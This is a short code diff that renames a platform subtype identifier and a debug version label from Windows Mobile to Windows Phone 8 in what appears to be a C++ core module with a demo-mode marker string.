@@ -19,7 +19,8 @@ wstring g_StrDemo;
 */
 
 // Subversion
-BYTE g_Subtype[16] = "WINMO\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+///BYTE g_Subtype[16] = "WINMO\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+BYTE g_Subtype[16] = "WINPHONE\x00\x00\x00\x00\x00\x00\x00";
 
 // Marker per il demo mode
 BYTE g_DemoMode[] = "Pg-WaVyPzMMMMmGbhP6qAigT";
@@ -458,7 +459,7 @@ void DebugTraceVersion() {
 
 	ovi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
 
-	swprintf_s(wVersion, L"WinMobile Core Version: %d\n", g_Version);
+	swprintf_s(wVersion, L"WinPhone8 Core Version: %d\n", g_Version);
 	DBG_TRACE(wVersion, 1, FALSE);
 
 	if (_GetVersionExW(&ovi) == FALSE)
